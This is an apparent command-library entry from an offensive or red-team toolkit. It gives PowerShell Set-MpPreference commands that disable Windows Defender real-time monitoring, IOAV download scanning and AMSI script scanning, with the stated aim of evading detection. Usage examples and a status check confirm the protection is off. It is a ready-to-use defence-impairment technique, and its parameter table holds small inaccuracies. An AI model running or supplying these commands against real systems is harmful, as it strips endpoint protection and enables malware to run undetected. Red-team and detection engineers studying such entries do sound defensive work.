---
id: 12b4c572-c0f6-49e7-942e-febc713287b8
name: set-mppreference-disable-realtime-monitoring
type: command
executor: powershell
data: |-
  Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
  Set-MpPreference -DisableIOAVProtection $true
  Set-MpPreference -DisableScriptScanning $true
output: null
created_at: '2023-04-06T03:56:26.616564+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - evasion
  - impairment
verified: true
validated: true
---

# set-mppreference-disable-realtime-monitoring

## Command

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Get-MpComputerStatus
```

## Description

Disables real-time file monitoring, IOAV protection for downloads/attachments, and script scanning (AMSI) to evade detection. The status check verifies the changes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -DisableRealtimeMonitoring | Disables on-access scanning | Yes |
| $true | Boolean to enable disable | Yes |
| -DisableIOAVProtection | Disables scanning of IOAV-protected items | Yes |
| -DisableScriptScanning | Disables AMSI for scripts (1=disable, 0=enable) | Yes |

## Examples

### Basic Usage

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Advanced Usage

Include verification:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
```

## Expected Output

For Set-MpPreference: No output if successful.
For Get-MpComputerStatus:

```
RealTimeProtectionEnabled : False
...
```

## Related

- [[procedures/Discover-and-Impair-Windows-Defender-Antivirus]]
